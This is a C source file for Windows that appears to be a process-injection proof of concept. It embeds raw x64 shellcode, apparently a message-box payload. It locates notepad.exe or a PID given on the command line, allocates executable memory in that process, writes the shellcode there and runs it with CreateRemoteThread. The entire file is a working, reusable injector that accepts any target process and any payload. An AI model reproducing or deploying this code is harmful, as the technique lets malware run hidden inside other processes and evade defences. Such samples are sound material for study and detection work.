#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

unsigned char shellcode[] =
        "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x65\x00\x00\x00"
        "\x48\x8D\x0D\x51\x00\x00\x00\xE8\xA3\x00\x00\x00\x49\x89\xC7"
        "\x48\x8D\x0D\x5C\x00\x00\x00\x41\xFF\xD7\x48\x8D\x15\x5D\x00"
        "\x00\x00\x48\x8D\x0D\x4B\x00\x00\x00\xE8\x83\x00\x00\x00\x45"
        "\x31\xC9\x4C\x8D\x05\x5F\x00\x00\x00\x48\x8D\x15\x4C\x00\x00"
        "\x00\x31\xC9\xFF\xD0\x48\x8D\x15\x5B\x00\x00\x00\x48\x8D\x0D"
        "\x09\x00\x00\x00\xE8\x5B\x00\x00\x00\x31\xC9\xFF\xD0\x4B\x45"
        "\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61\x64"
        "\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33\x32"
        "\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F\x78"
        "\x41\x00\x4E\x61\x64\x65\x72\x20\x41\x79\x6D\x61\x6E\x00\x41"
        "\x72\x74\x66\x75\x6C\x20\x44\x6F\x64\x67\x65\x72\x00\x45\x78"
        "\x69\x74\x50\x72\x6F\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65"
        "\x4C\x8B\x04\x25\x60\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60"
        "\x10\x4D\x8B\x04\x24\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84"
        "\xC0\x74\x26\x8A\x27\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0"
        "\x75\x08\x48\xFF\xC7\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B"
        "\xC4\x75\xD6\x48\x33\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30"
        "\x44\x8B\x4B\x3C\x4C\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45"
        "\x8B\x29\x4D\x85\xED\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00"
        "\x4E\x8D\x04\x2B\x45\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18"
        "\x45\x8B\x50\x20\x4C\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B"
        "\x39\x48\x03\xFB\x48\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74"
        "\x09\xEB\xF5\xE2\xE6\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C"
        "\x03\xCB\x66\x41\x8B\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41"
        "\x8B\x04\x89\x49\x3B\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D"
        "\x34\x18\x48\x8D\x7C\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75"
        "\xFA\xA4\xC7\x07\x44\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49"
        "\x8B\xCC\x48\x8B\xD6\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83"
        "\xC4\x28\xC3";

DWORD FindProcessByName(const wchar_t* processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe = { 0 };
    pe.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(snapshot, &pe)) {
        CloseHandle(snapshot);
        return 0;
    }

    do {
        if (_wcsicmp(pe.szExeFile, processName) == 0) {
            DWORD pid = pe.th32ProcessID;
            CloseHandle(snapshot);
            return pid;
        }
    } while (Process32NextW(snapshot, &pe));

    CloseHandle(snapshot);
    return 0;
}

int main(int argc, char* argv[]) {
    DWORD pid = 0;
    HANDLE hProcess = NULL;
    LPVOID remoteMem = NULL;
    HANDLE hThread = NULL;
    SIZE_T shellcodeSize = sizeof(shellcode);

    printf("[*] Process Injector - CreateRemoteThread\n");
    printf("[*] Shellcode size: %zu bytes\n", shellcodeSize);

    // Target PID
    if (argc >= 2) {
        pid = atoi(argv[1]);
        printf("[*] Target PID from argument: %d\n", pid);
    } else {
        pid = FindProcessByName(L"notepad.exe");
        if (!pid) {
            printf("[!] notepad.exe not found. Please run notepad.exe first.\n");
            return 1;
        }
        printf("[+] Found notepad.exe with PID: %d\n", pid);
    }

    hProcess = OpenProcess(
            PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
            PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
            FALSE, pid);
    printf("[+] Process opened (Handle: 0x%p)\n", hProcess);

    remoteMem = VirtualAllocEx(hProcess, NULL, shellcodeSize,
                               MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        printf("[!] VirtualAllocEx failed. Error: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Memory allocated at 0x%p\n", remoteMem);

    if (!WriteProcessMemory(hProcess, remoteMem, shellcode, shellcodeSize, NULL)) {
        printf("[!] WriteProcessMemory failed. Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Shellcode written to remote process\n");

    hThread = CreateRemoteThread(hProcess, NULL, 0,
                                 (LPTHREAD_START_ROUTINE)remoteMem,
                                 NULL, 0, NULL);
    if (!hThread) {
        printf("[!] CreateRemoteThread failed. Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    printf("[+] Remote thread created (Handle: 0x%p)\n", hThread);
    printf("[*] Waiting for shellcode execution (5s)...\n");

    WaitForSingleObject(hThread, 5000);

    CloseHandle(hThread);
    CloseHandle(hProcess);

    printf("[+] Injection completed!\n");
    return 0;
}
